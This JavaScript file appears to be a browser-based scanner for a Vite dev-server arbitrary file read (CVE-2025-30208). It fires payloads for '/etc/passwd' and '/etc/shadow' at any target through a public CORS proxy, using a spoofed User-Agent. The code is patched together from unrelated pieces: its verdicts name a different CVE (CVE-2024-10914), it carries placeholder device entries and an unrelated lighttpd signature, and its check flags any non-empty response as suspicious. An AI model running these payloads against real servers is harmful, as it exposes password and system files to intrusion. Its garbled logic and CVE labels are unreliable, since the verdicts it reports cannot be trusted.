/**
 * CVE-2025-30208 Vulnerability Checker
 * This script checks for arbitrary file read vulnerability in Vite dev server
 * through various crafted endpoint payloads.
 */

const PAYLOADS = [
    "/@fs/etc/passwd?raw??",
    "/@fs/etc/shadow?raw&url",
    "/@fs/etc/shadow-?raw&module",
    "/@fs/etc/hostname?import&raw??",
    "/@fs/etc/services?raw&import"
];

const PROXY_URL = 'https://cors-anywhere.herokuapp.com/';

const VULNERABLE_DEVICES = {
    "WebApp-1.0": {
        versions: ["1.0.0", "1.0.1", "1.0.2"],
        cpe: {
            application: "cpe:2.3:a:webapp:webapp:1.0:*:*:*:*:*:*:*:*"
        }
    },
    "WebApp-2.0": {
        versions: ["2.0.0", "2.0.1"],
        cpe: {
            application: "cpe:2.3:a:webapp:webapp:2.0:*:*:*:*:*:*:*:*"
        }
    },
    "CMS-System": {
        versions: ["3.1", "3.2"],
        cpe: {
            application: "cpe:2.3:a:cms:cms_system:3.1:*:*:*:*:*:*:*:*"
        }
    }
};

const TARGET_HISTORY_KEY = 'cve_2024_10914_target_history';

const SERVER_SIGNATURES = {
    'lighttpd': {
        versions: ['1.4.25', '1.4.25-devel'],
        risk: 'Medium',
        details: 'Older version of lighttpd server detected'
    }
};

function saveTargetHistory(target, result) {
    try {
        let history = JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
        
        history.unshift({
            target,
            result,
            timestamp: new Date().toISOString()
        });
        
        history = history.slice(0, 10);
        
        localStorage.setItem(TARGET_HISTORY_KEY, JSON.stringify(history));
    } catch (error) {
        console.error('Error saving target history:', error);
    }
}

function getTargetHistory() {
    try {
        return JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
    } catch (error) {
        console.error('Error getting target history:', error);
        return [];
    }
}

function clearTargetHistory() {
    try {
        localStorage.removeItem(TARGET_HISTORY_KEY);
    } catch (error) {
        console.error('Error clearing target history:', error);
    }
}

function checkLastModified(lastModified) {
    if (!lastModified) return null;
    
    const lastModifiedDate = new Date(lastModified);
    const currentDate = new Date();
    const yearsOld = (currentDate - lastModifiedDate) / (1000 * 60 * 60 * 24 * 365);
    
    if (yearsOld > 5) {
        return {
            warning: true,
            message: `Warning: Server content is very old (${Math.floor(yearsOld)} years). This may indicate an outdated or unmaintained system.`
        };
    }
    
    return null;
}

async function analyzeServerHeaders(headers) {
    const analysis = {
        serverInfo: null,
        lastModified: null,
        securityHeaders: {},
        warnings: []
    };

    const serverHeader = headers.get('server');
    if (serverHeader) {
        for (const [server, info] of Object.entries(SERVER_SIGNATURES)) {
            if (serverHeader.toLowerCase().includes(server.toLowerCase())) {
                analysis.serverInfo = {
                    type: server,
                    version: serverHeader,
                    risk: info.risk,
                    details: info.details
                };
                break;
            }
        }
    }


    const lastModified = headers.get('last-modified');
    if (lastModified) {
        const lastModifiedDate = new Date(lastModified);
        const currentDate = new Date();
        const yearsOld = (currentDate - lastModifiedDate) / (1000 * 60 * 60 * 24 * 365);
        
        analysis.lastModified = {
            date: lastModifiedDate,
            age: yearsOld,
            warning: yearsOld > 5
        };

        if (yearsOld > 5) {
            analysis.warnings.push(`Server content is very old (${Math.floor(yearsOld)} years)`);
        }
    }


    const securityHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection',
        'content-security-policy',
        'strict-transport-security'
    ];

    securityHeaders.forEach(header => {
        analysis.securityHeaders[header] = headers.get(header) ? 'Present' : 'Missing';
    });

    return analysis;
}

async function checkVulnerability(targetUrl, port = 80) {
    try {
        const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
        let hasConnectionError = false;
        let successfulResponses = 0;
        let errorResponses = 0;
        let suspiciousResponses = 0;
        let serverAnalysis = null;
        let responseTimes = [];
        
        try {
            const startTime = performance.now();
           
            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}/`;
            const response = await fetch(testUrl, {
                method: 'HEAD',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
                    'Origin': window.location.origin,
                    'X-Requested-With': 'XMLHttpRequest'
                },
                timeout: 10000
            });
            
            const endTime = performance.now();
            responseTimes.push(endTime - startTime);
            
            if (!response.ok) {
                const result = {
                    vulnerable: false,
                    details: 'Target is not reachable',
                    confidence: 'High',
                    evidence: {
                        status: response.status,
                        statusText: response.statusText
                    }
                };
                saveTargetHistory(`${cleanUrl}:${port}`, result);
                return result;
            }

            serverAnalysis = await analyzeServerHeaders(response.headers);
            
        } catch (error) {
            console.error('Initial connection error:', error);
            const result = {
                vulnerable: false,
                details: 'Target is not reachable',
                confidence: 'High',
                evidence: {
                    error: error.message
                }
            };
            saveTargetHistory(`${cleanUrl}:${port}`, result);
            return result;
        }
        
        for (const endpoint of PAYLOADS) {
            const startTime = performance.now();

            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}${endpoint}`;
            
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                const response = await fetch(testUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': '*/*',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': window.location.origin
                    },
                    signal: controller.signal,
                    credentials: 'omit'
                });

                const endTime = performance.now();
                responseTimes.push(endTime - startTime);

                clearTimeout(timeoutId);

                if (response.status === 200) {
                    const text = await response.text();
                    if (/uid=\d+\(\w+\).*gid=\d+\(\w+\)/.test(text) || text.includes("uid=") || text.includes("root")) {
                        successfulResponses++;
                    }
                    if (text.includes("VITE") || text.includes("root") || text.includes("password") || text.length > 0) {
                        suspiciousResponses++;
                    }
                }
            } catch (error) {
                console.error('Payload request error:', error);
                if (error.name === 'AbortError') {
                    hasConnectionError = true;
                } else {
                    console.error('Error during scan:', error);
                }
            }

            await new Promise(resolve => setTimeout(resolve, 500));
        }

        const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
        const performanceWarning = avgResponseTime > 1000 ? {
            warning: true,
            message: `Server response time is slow (${Math.round(avgResponseTime)}ms average)`
        } : null;

        let result;
        if (successfulResponses > 0) {
            result = {
                vulnerable: true,
                details: 'Target is vulnerable to CVE-2024-10914',
                confidence: 'High',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else if (suspiciousResponses > 0) {
            result = {
                vulnerable: true,
                details: 'Target may be vulnerable to CVE-2024-10914',
                confidence: 'Medium',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else if (hasConnectionError) {
            result = {
                vulnerable: false,
                details: 'Connection timeout occurred',
                confidence: 'Medium',
                evidence: {
                    hasConnectionError: true,
                    serverAnalysis,
                    performanceWarning
                }
            };
        } else {
            result = {
                vulnerable: false,
                details: 'Target is not vulnerable to CVE-2024-10914',
                confidence: 'High',
                evidence: {
                    successfulResponses,
                    suspiciousResponses,
                    errorResponses,
                    serverAnalysis,
                    performanceWarning
                }
            };
        }

        saveTargetHistory(`${cleanUrl}:${port}`, result);
        return result;

    } catch (error) {
        console.error('Main error:', error);
        const result = {
            vulnerable: false,
            details: 'Error occurred during check: ' + error.message,
            confidence: 'Unknown',
            evidence: {
                error: error.message
            }
        };
        saveTargetHistory(`${cleanUrl}:${port}`, result);
        return result;
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        checkVulnerability, 
        VULNERABLE_DEVICES,
        getTargetHistory,
        clearTargetHistory
    };
} 
